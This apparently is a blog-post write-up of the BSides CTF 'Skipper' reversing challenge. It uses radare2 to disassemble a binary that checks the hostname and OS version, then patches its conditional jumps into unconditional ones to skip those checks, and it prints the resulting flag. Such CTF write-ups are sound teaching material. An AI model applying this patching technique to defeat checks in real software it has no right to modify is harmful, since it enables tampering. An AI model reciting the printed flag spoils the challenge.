org/_posts/2017-02-14-bsides-ctf-writeup.org
** Skipper
   In this challenge I'm going to use one of the best disassemblers available
   today: [[http://radare.org/r/][radare]] . It is both free and contains many facilities for modifying
   the binary in various ways (without plugins). (You could also solve this
   challenge with a debugger very easily)

   #+BEGIN_EXAMPLE
   cp tmp/skipper64 /tmp/skipper64-backup # a backup in case you fubar the binary
   r2 /tmp/skipper64
   #+END_EXAMPLE

   Next, seek the read head to the =main= symbol and tap ~V~ key to bring yourself
   into disassembly.

   #+BEGIN_EXAMPLE
   [0x004026d1]> s main
   #+END_EXAMPLE

   #+BEGIN_EXAMPLE
       0x004026d1      push rbp                                                                                                                                                                                
       0x004026d2      mov rbp, rsp                                                                                                                                                                            
       0x004026d5      sub rsp, 0x420                                                                                                                                                                          
       0x004026dc      mov dword [rbp - 0x414], edi                                                                                                                                                            
       0x004026e2      mov qword [rbp - 0x420], rsi                                                                                                                                                            
       0x004026e9      mov rax, qword fs:[0x28]                   ; [0x28:8]=0x3200 ; '('                                                                                                                      
       0x004026f2      mov qword [rbp - 8], rax                                                                                                                                                                
       0x004026f6      xor eax, eax                                                                                                                                                                            
       0x004026f8      lea rax, [rbp - 0x410]                                                                                                                                                                  
       0x004026ff      mov rdi, rax                                                                                                                                                                            
       0x00402702      call 0x400b3e                              ;[1]                                                                                                                                         
       0x00402707      lea rax, [rbp - 0x410]                                                                                                                                                                  
       0x0040270e      mov rsi, rax                                                                                                                                                                            
       0x00402711      mov edi, str.Computer_name:__s_n           ; "Computer name: %s." @ 0x402987                                                                                                            
       0x00402716      mov eax, 0                                                                                                                                                                              
       0x0040271b      call sym.imp.printf                        ;[2]                                                                                                                                         
       0x00402720      lea rax, [rbp - 0x410]                                                                                                                                                                  
       0x00402727      mov esi, str.hax0rz__                      ; "hax0rz!~" @ 0x40299a                                                                                                                      
       0x0040272c      mov rdi, rax                                                                                                                                                                            
       0x0040272f      call sym.imp.strcmp                        ;[3]                                                                                                                                         
       0x00402734      test eax, eax                                                                                                                                                                           
   ┌─< 0x00402736      je 0x40275b                                ;[4]                                                                                                                                         
   │   0x00402738      lea rax, [rbp - 0x410]                                                                                                                                                                  
   │   0x0040273f      mov rsi, rax                                                                                                                                                                            
   │   0x00402742      mov edi, str.Sorry ; "Sorry, your computer's name - %s - is not correct!." @ 0x4029a8                                                    
   │   0x00402747      mov eax, 0                                                                                                                                                                              
   │   0x0040274c      call sym.imp.printf                        ;[2]                                                                                                                                         
   │   0x00402751      mov edi, 9                                                                                                                                                                              
   │   0x00402756      call sym.imp.raise                         ;[5]                                                                                                                                         
   └─> 0x0040275b      lea rax, [rbp - 0x410]                                                                                                                                                                  
       0x00402762      mov rdi, rax                                                                                                                                                                            
       0x00402765      call 0x400c4a                              ;[6]                                                                                                                                         
       0x0040276a      lea rax, [rbp - 0x410]                                                                                                                                                                  
       0x00402771      mov rsi, rax                                                                                                                                                                            
       0x00402774      mov edi, str.OS_version:__s_n              ; "OS version: %s." @ 0x4029dc                                                                                                               
       0x00402779      mov eax, 0                                                                                                                                                                              
       0x0040277e      call sym.imp.printf                        ;[2]                                                                                                                                         
       0x00402783      lea rax, [rbp - 0x410]                                                                                                                                                                  
       0x0040278a      mov esi, str.2.4.31                        ; "2.4.31" @ 0x4029ec                                                                                                                        
       0x0040278f      mov rdi, rax                                                                                                                                                                            
       0x00402792      call sym.imp.strcmp                        ;[3]                                                                                                                                         
       0x00402797      test eax, eax                                                                                                                                                                           
   ┌─< 0x00402799      je 0x4027e3                                ;[7]                                                                                                                                         
   │   0x0040279b      lea rax, [rbp - 0x410]                                                                                                                                                                  
   │   0x004027a2      mov rsi, rax                                                                                                                                                                            
   │   0x004027a5      mov edi, str.Sorry__your_OS_version____s___is_not_supported__n
   #+END_EXAMPLE

   You can see here that several functions are being called and compared against
   builtin strings like /hax0r!~/. The context gives you an idea that it's checking
   the hostname, but let's be sure.

   #+BEGIN_EXAMPLE
   [0x004026d1]> s 0x400b3e
   [0x00400b67]> pd 10 @ +64
   0x00400ba7      mov edi, 1
   0x00400bac      call sym.imp.exit
   0x00400bb1      mov ecx, 0
   0x00400bb6      mov edx, 0x40291f                          ; "-n"
   0x00400bbb      mov esi, str.uname                         ; "uname" @ 0x402922
   0x00400bc0      mov edi, str.uname                         ; "uname" @ 0x402922
   0x00400bc5      mov eax, 0
   0x00400bca      call sym.imp.execlp
   0x00400bcf      call sym.imp.__errno_location
   0x00400bd4      mov eax, dword [rax]
   #+END_EXAMPLE

   You can see it's calling =uname= here. Before you start changing your system's
   configuration to accommodate, first know it's not possible to set your hostname
   to this value.

   This means you are going to either have to use a debugger and manually change
   the =ZF=, =CF=, =OF= or other condition flags or patch up all of the =je=
   instructions.

   #+BEGIN_EXAMPLE
   [0x00400b67]> oo+ # This makes the binary writable
   [0x00400b67]> wao jmp @ 0x00402736
   [0x00400b67]> wao jmp @ 0x00402799
   ...
   #+END_EXAMPLE

   After this, run the binary and get the flag! ~FLAG:f51579e9ca38ba87d71539a9992887ff~


